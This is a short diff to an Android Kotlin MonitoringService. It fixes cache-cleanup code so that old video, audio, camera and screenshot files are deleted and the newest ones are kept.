@@ -9372,7 +9372,7 @@ class MonitoringService : Service() {
             val files = cacheDir.listFiles { file ->
                 file.isFile && file.name.startsWith("video_") && file.name.endsWith(".mp4")
             }?.sortedBy { it.lastModified() }?.filter { !isMediaActive(it) } ?: return
-            val dropped = files.drop(maxKept)
+            val dropped = files.dropLast(maxKept)
             if (dropped.isEmpty()) return
             dropped.forEach { deleteQuietly(it) }
             try {
@@ -9448,7 +9448,7 @@ class MonitoringService : Service() {
             val files = cacheDir.listFiles { file ->
                 file.isFile && file.name.startsWith("audio_") && file.name.endsWith(".m4a")
             }?.sortedBy { it.lastModified() }?.filter { !isMediaActive(it) } ?: return
-            val dropped = files.drop(maxKept)
+            val dropped = files.dropLast(maxKept)
             if (dropped.isEmpty()) return
             dropped.forEach { deleteQuietly(it) }
             try {
@@ -9740,7 +9740,7 @@ class MonitoringService : Service() {
                 file.isFile && (file.name.startsWith("camera_") || file.name.startsWith("screenshot_")) && file.name.endsWith(".jpg")
             }?.sortedBy { it.lastModified() }?.filter { !isMediaActive(it) } ?: return -1
             if (photos.size <= maxKept) return photos.size
-            val dropped = photos.drop(maxKept)
+            val dropped = photos.dropLast(maxKept)
             val remaining = photos.size - dropped.size
             dropped.forEach { deleteQuietly(it) }
             try {
